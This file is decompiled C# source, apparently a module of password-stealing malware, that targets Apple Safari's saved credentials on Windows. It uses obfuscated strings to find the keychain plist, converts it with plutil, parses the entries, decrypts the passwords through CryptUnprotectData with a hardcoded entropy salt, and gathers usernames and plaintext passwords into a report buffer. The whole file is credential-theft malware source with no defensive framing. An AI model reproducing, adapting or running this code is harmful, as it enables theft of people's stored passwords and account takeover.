using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DASafari
{
	public class SFRIDL
	{
		public struct DATA_BLOG
		{
			public int cbData;

			public IntPtr pbData;
		}

		public struct UserEntry
		{
			public string Username;

			public string encPassword;

			public string decPassword;

			public string Description;

			public string Label;

			public string Path;

			public string Comment;

			public string Server;

			public int Protocol;

			public int AuthenticationType;

			public int Port;

			public int UserIndex;
		}

		public static byte[] salt = new byte[144]
		{
			29, 172, 168, 248, 211, 184, 72, 62, 72, 125,
			62, 10, 98, 7, 221, 38, 230, 103, 129, 3,
			231, 178, 19, 165, 176, 121, 238, 79, 15, 65,
			21, 237, 123, 20, 140, 229, 75, 70, 13, 193,
			142, 254, 214, 231, 39, 117, 6, 139, 73, 0,
			220, 15, 48, 160, 158, 253, 9, 133, 241, 200,
			170, 117, 193, 8, 5, 121, 1, 226, 151, 216,
			175, 128, 56, 96, 11, 113, 14, 104, 83, 119,
			47, 15, 97, 246, 29, 142, 143, 92, 178, 61,
			33, 116, 64, 75, 181, 6, 110, 171, 122, 189,
			139, 169, 126, 50, 143, 110, 6, 36, 217, 41,
			164, 165, 190, 38, 35, 253, 238, 241, 76, 15,
			116, 94, 88, 251, 145, 116, 239, 145, 99, 111,
			109, 46, 97, 112, 112, 108, 101, 46, 83, 97,
			102, 97, 114, 105
		};

		[SpecialName]
		private static string[] _0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks;

		public static IntPtr LocalFree(IntPtr hMem)
		{
			IntPtr result = default(IntPtr);
			return result;
		}

		public static bool CryptUnprotectData(ref DATA_BLOG pDataIn, string szDataDescr, ref DATA_BLOG pOptionalEntropy, IntPtr pvReserved, ref IntPtr pPromptStruct, int dwFlags, ref DATA_BLOG pDataOut)
		{
			return false;
		}

		public static UserEntry[] STCHUSRENTR()
		{
			UserEntry[] result = default(UserEntry[]);
			try
			{
				string plutil = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + RUDUUFDP.CPMXFIPG("dXeus6WIol+MoYWZsqJ5iaSrq5RapK+ynTl1r7akgpeguqGIol+ZrYmkrrisdaSru6yCoG2rsH4u", "False");
				string keychain = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("mJjS2cehd6XYyKzM1s7NmKfUzsGhycfXvqHKvtTAtbrKysSqhdLVxK/LDA==", "False");
				string fixedPath = null;
				if (!CNVRTKYCHN(plutil, keychain, ref fixedPath))
				{
					result = null;
					return result;
				}
				result = PRSEENTRS(fixedPath.Remove(checked(fixedPath.Length - 2))).ToArray();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static List<UserEntry> PRSEENTRS(string keychain)
		{
			string input = File.ReadAllText(keychain);
			List<UserEntry> list = new List<UserEntry>();
			checked
			{
				try
				{
					int num = InlineAssignHelper(ref _0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks, Regex.Split(Regex.Split(input, RUDUUFDP.CPMXFIPG("Wpq2vZ6Xdyo=", "False"))[1], RUDUUFDP.CPMXFIPG("XaCwsbRfJg==", "False"))).Length - 1;
					for (int i = 1; i <= num; i++)
					{
						UserEntry item = default(UserEntry);
						item.Username = GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("Y7XBxq+VqYsi", "False"), RUDUUFDP.CPMXFIPG("c4HQ2MigwMSiEw==", "False"), 0);
						item.AuthenticationType = int.Parse(GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("e8PT4MOmv9eqCw==", "False"), RUDUUFDP.CPMXFIPG("VmSpta1/nKW5dyw=", "False"), 0));
						item.Comment = GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("Y7XBxq+VqYsi", "False"), RUDUUFDP.CPMXFIPG("c4HQ2MigwMSiEw==", "False"), 1);
						item.encPassword = GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("fsHJ48KABQ==", "False"), RUDUUFDP.CPMXFIPG("coDAxMmXjxI=", "False"), 0);
						item.Description = GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("Y7XBxq+VqYsi", "False"), RUDUUFDP.CPMXFIPG("c4HQ2MigwMSiEw==", "False"), 2);
						item.Label = GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("Y7XBxq+VqYsi", "False"), RUDUUFDP.CPMXFIPG("c4HQ2MigwMSiEw==", "False"), 3);
						item.Path = GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("Y7XBxq+VqYsi", "False"), RUDUUFDP.CPMXFIPG("c4HQ2MigwMSiEw==", "False"), 4);
						item.Port = int.Parse(GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("e8PT4MOmv9eqCw==", "False"), RUDUUFDP.CPMXFIPG("VmSpta1/nKW5dyw=", "False"), 1));
						item.Protocol = int.Parse(GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("e8PT4MOmv9eqCw==", "False"), RUDUUFDP.CPMXFIPG("VmSpta1/nKW5dyw=", "False"), 2));
						item.Server = GetBetween(_0024STATIC_0024PRSEENTRS_00240115123511180C4E_0024blocks[i], RUDUUFDP.CPMXFIPG("Y7XBxq+VqYsi", "False"), RUDUUFDP.CPMXFIPG("c4HQ2MigwMSiEw==", "False"), 5);
						item.UserIndex = i - 1;
						item.decPassword = DECRYPTPSS(Convert.FromBase64String(item.encPassword));
						list.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				return list;
			}
		}

		public void SAFRGT()
		{
			try
			{
				UserEntry[] array = STCHUSRENTR();
				JNXOYT.LXMYL = RUDUUFDP.CPMXFIPG("eZSfpph5lJ+mmHmUn6aYeZSfpph5lJ+mmHmUn6aYj7jIys2ld67YwqXF1aaYeZSfpph5lJ+mmHmUn6aYeZSfpph5lJ+mmHmUnw0=", "False");
				UserEntry[] array2 = array;
				for (int i = 0; i < array2.Length; i = checked(i + 1))
				{
					UserEntry userEntry = array2[i];
					JNXOYT.LXMYL = JNXOYT.LXMYL + Environment.NewLine + RUDUUFDP.CPMXFIPG("icK/08GVvL+bcxI=", "False") + userEntry.Username;
					JNXOYT.LXMYL = JNXOYT.LXMYL + Environment.NewLine + RUDUUFDP.CPMXFIPG("aJSxuK6HpaJ/Vy4=", "False") + userEntry.decPassword + Environment.NewLine;
				}
				JNXOYT.LXMYL = JNXOYT.LXMYL + Environment.NewLine + RUDUUFDP.CPMXFIPG("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpAg=", "False");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static string DECRYPTPSS(byte[] pwBuffer)
		{
			checked
			{
				string result = default(string);
				try
				{
					int num = 0;
					object obj = Marshal.AllocHGlobal(pwBuffer.Length + 4);
					IntPtr intPtr = default(IntPtr);
					Marshal.Copy(pwBuffer, 0, (obj != null) ? ((IntPtr)obj) : intPtr, pwBuffer.Length);
					object obj2 = Marshal.AllocHGlobal(salt.Length);
					Marshal.Copy(salt, 0, (obj2 != null) ? ((IntPtr)obj2) : intPtr, salt.Length);
					DATA_BLOG pDataIn = default(DATA_BLOG);
					pDataIn.cbData = pwBuffer.Length;
					pDataIn.pbData = ((obj != null) ? ((IntPtr)obj) : intPtr);
					DATA_BLOG pOptionalEntropy = default(DATA_BLOG);
					pOptionalEntropy.cbData = salt.Length;
					pOptionalEntropy.pbData = ((obj2 != null) ? ((IntPtr)obj2) : intPtr);
					IntPtr zero = IntPtr.Zero;
					IntPtr pPromptStruct = IntPtr.Zero;
					DATA_BLOG pDataOut = default(DATA_BLOG);
					if (!CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, zero, ref pPromptStruct, 0, ref pDataOut))
					{
						result = null;
						return result;
					}
					Marshal.FreeHGlobal((obj != null) ? ((IntPtr)obj) : intPtr);
					Marshal.FreeHGlobal((obj2 != null) ? ((IntPtr)obj2) : intPtr);
					num = Marshal.ReadInt32(pDataOut.pbData);
					byte[] array = new byte[num + 1];
					ref IntPtr pbData = ref pDataOut.pbData;
					pbData = new IntPtr(pDataOut.pbData.ToInt32() + 4);
					Marshal.Copy(pDataOut.pbData, array, 0, num);
					LocalFree(pDataOut.pbData);
					char[] array2 = new char[num - 1 + 1];
					int num2 = num - 1;
					for (int i = 0; i <= num2; i++)
					{
						array2[i] = Strings.ChrW(unchecked((int)array[i]));
					}
					result = new string(array2);
					return result;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		public static bool CNVRTKYCHN(string plutil, string keychain, ref string fixedPath)
		{
			bool result = default(bool);
			try
			{
				fixedPath = null;
				if (!File.Exists(plutil))
				{
					result = false;
					return result;
				}
				Process process = new Process();
				process.StartInfo.FileName = plutil;
				process.StartInfo.Arguments = " -convert xml1 -s -o \"" + InlineAssignHelper(ref fixedPath, Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\fixed_keychain.xml\" ") + "\"" + keychain + "\"";
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.UseShellExecute = false;
				process.Start();
				process.WaitForExit();
				result = process.StandardOutput.ReadToEnd().Length == 0;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string GetBetween(string input, string str1, string str2, int index)
		{
			string result = default(string);
			try
			{
				string input2 = Regex.Split(input, str1)[checked(index + 1)];
				result = Regex.Split(input2, str2)[0];
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static T InlineAssignHelper<T>(ref T target, T value)
		{
			T result = default(T);
			try
			{
				target = value;
				result = value;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
